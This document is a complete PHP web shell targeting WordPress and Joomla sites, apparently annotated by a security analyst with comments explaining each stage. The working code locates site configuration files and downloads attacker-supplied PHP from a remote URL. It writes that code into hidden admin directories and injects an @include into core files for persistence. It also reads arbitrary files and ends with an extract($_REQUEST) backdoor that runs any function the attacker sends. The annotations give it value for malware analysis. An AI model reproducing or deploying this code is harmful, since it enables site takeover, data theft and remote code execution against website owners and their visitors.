<?php

# This function crawls the directories up to 10 using ./../ or until it finds wp-config.php or configuration.php
# If found, it display how many directories up is the file
if (!empty($_POST['jkuyr5t']) && $_POST['jkuyr5t'] = "fghse5s") {
    $i = 0;
    $g = 0;
    $directory = "./";
    do {
        if (in_array("wp-config.php", scandir($directory))) {
            echo "ggg" . $g . "ggg";
            echo "ppp" . $directory . "ppp";
            echo "tttwpttt";
            die();
        }
        if (in_array("configuration.php", scandir($directory)) && in_array("components", scandir($directory))) {
            echo "ggg" . $g . "ggg";
            echo "ppp" . $directory . "ppp";
            echo "tttjmlttt";
            die();
        }
        $directory .= "../";
        $g++;
        $i++;
    } while ($i != 10);
	
	# Function successfully executed, but no config file found
    echo "sdghfgxfhytdrf";
    die();
}

# This function allows them to download a payload and write it to disk
# It could be used to download other webshells
if (!empty($_POST['hjutr4w']) && $_POST['hjutr4w'] = "nrs45r" && !empty($_POST['xcbn7r']) && !empty($_POST['ep8trd'])) {
	
	# Download the file at the URL passed as POST value
    $w = file_get_contents(urldecode($_POST['xcbn7r']));
	
	# Appends the POST value to the file downloaded
    if (!empty($_POST["net42w"])) {
        if(stripos("qqq".$w, "Set the error_reporting")){
            $w = str_ireplace("Set the error_reporting", "Set the error_reporting \n".urldecode($_POST["net42w"]), $w);
        } else {			
            $w .= "\n" . urldecode($_POST["net42w"]);
        }
    }
	
	# Write the file downloaded to disk under the name passed as POST value
    file_put_contents(urldecode($_POST['ep8trd']), $w);
}

# This function fetches the file passed as the POST value and displays it.
if (!empty($_POST['fgh6454']) && $_POST['fgh6454'] = "nr5ydfg" && !empty($_POST['zv4yye'])) {
    echo file_get_contents($_POST['zv4yye']);
    die();
}

if(!empty($_POST["makeblind"]) && !empty(!empty($_POST["clurl"]))){
    $resIncl = "";
    $fromRPath = "";
    $iPath = "";
    $type = "";
    $clname = "";
    $i = 0;
    $g = 0;
    $p = "./";

	# Check if the site is running WordPress or Joomla
    do {
        if (in_array("wp-config.php", scandir($p))) {
            $type = "wp";
            break;
        }
        if (in_array("configuration.php", scandir($p)) && in_array("components", scandir($p))) {
            $type = "jml";
            break;
        }
        $p .= "../";
        $g++;
        $i++;
    } while ($i != 10);
	
	# $rPath contains the directory path
    $rPath = dirname(__FILE__);
    $rPath = explode("/", $rPath);
    $rPath = array_slice($rPath, 0, -$i);

    $rPath = implode("/", $rPath);
    $rPath = rtrim($rPath, "/");
    if(!empty($type) && $type == "wp") {
        $path = $rPath."/wp-load.php";
    }
    if(!empty($type) && $type == "jml") {
        $path = $rPath."/includes/framework.php";
    }
	
	# Download more malicious PHP code
    $clCode = file_get_contents(urldecode($_POST["clurl"]));
	
	# If the hash of the file downloaded is good ...
    if(md5($clCode) == $_POST["clmd5"]){
		
		# Generate a random file name for the PHP that just got downloaded
        $clname = randString(7).".php";
        $filename = "";
        if($type == "wp") {
            $filename = $rPath . "/wp-admin/css/colors/blue/".$clname;
        } elseif($type == "jml"){
            $filename = $rPath . "components/com_fields/models/forms/".$clname;
        }
		# If the file has been created
        if(!empty($filename)) {
            $fd = fopen($filename, "w+");
			# Open the file and write the content of $clCode in it.
            fwrite($fd, $clCode);
            fclose($fd);
            if (file_exists($filename)) {
				
				# To Include the malicious file just created in the wp-config.php
                $toincl = file_get_contents($path);
                if(!stripos("qqq".$toincl, "@include")) {
                    $incl = '@include("' . $filename . '");';
                    if ($type == "wp") {
                        $toincl .= "\n" . $incl;
                    } elseif ($type == "jml") {
                        $toincl = str_ireplace("Set the error_reporting", "Set the error_reporting \n" . $incl, $toincl);
                    }
                    $fd = fopen($path, "w+");
                    fwrite($fd, $toincl);
                    fclose($fd);					
                    $check = file_get_contents($path);
                    if (stripos("qqq" . $check, $incl)) {
                        $resIncl = $incl;
                        $fromRPath = $filename;
                        $iPath = $rPath . "/";
                    }
                } else {
                    $resIncl = "";
                    $fromRPath = "";
                    $iPath = "haveincl";
                    $clname = "";
                }
            }
        }
    }
	# Display the information back to the attacker
	# The info includes the backdoor path and name
    echo "t34sga".
        serialize(array(
            "type" => $type,
            "incl" => $resIncl,
            "frpath" => $fromRPath,
            "ipath" => $iPath,
            "clname" => $clname
        ))
        ."t34sga";
    die();
}

# Generate a random string of length $length
function randString($length)
{
    $str = "";
    $chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    $size = strlen($chars);
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[rand(0, $size - 1)];
    }
    return $str;
}

# PHP Extract Backdoor
# Extract any content sent via GET or POST requests and creating variables for them
# That means that in the next part of the code, where it executes “die” (exit) on $y4e5tyt($msr4y6),
# it is actually executing whatever the attacker sends as “y4e5tyt” with “msr4y6” as an argument.
# Reference: https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html
@extract($_REQUEST);
@die ($y4e5tyt($msr4y6));